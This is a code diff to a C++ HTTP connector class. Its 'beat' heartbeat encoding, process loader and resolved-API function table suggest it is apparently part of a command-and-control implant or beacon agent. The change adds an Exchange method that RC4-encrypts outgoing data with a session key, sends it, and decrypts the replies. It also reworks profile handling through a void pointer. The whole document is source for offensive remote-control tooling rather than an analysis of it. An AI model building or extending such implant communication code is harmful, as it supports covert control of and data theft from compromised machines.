@@ -3,6 +3,7 @@
 #include "ApiDefines.h"
 #include "ProcLoader.h"
 #include "Encoders.h"
+#include "Crypt.h"
 #include "utils.h"
 
 
@@ -87,8 +88,9 @@ ConnectorHTTP::ConnectorHTTP()
 	}
 }
 
-BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
+BOOL ConnectorHTTP::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
 {
+	ProfileHTTP profile = *(ProfileHTTP*)profilePtr;
 	LPSTR encBeat = b64_encode(beat, beatSize);
 
 	ULONG enc_beat_length = StrLenA(encBeat);
@@ -393,6 +395,24 @@ void ConnectorHTTP::RecvClear()
 		memset(this->recvData, 0, this->recvSize);
 		this->functions->LocalFree(this->recvData);
 		this->recvData = NULL;
+	}
+}
+
+void ConnectorHTTP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
+{
+	if (plainData && plainSize > 0) {
+		EncryptRC4(plainData, plainSize, sessionKey, 16);
+		this->SendData(plainData, plainSize);
+	}
+	else {
+		this->SendData(NULL, 0);
+	}
+
+	if (this->recvSize > 0 && this->recvData) {
+		int dataSize = this->RecvSize();
+		BYTE* dataPtr = this->RecvData();
+		if (dataSize > 0 && dataPtr)
+			DecryptRC4(dataPtr, dataSize, sessionKey, 16);
 	}
 }
 
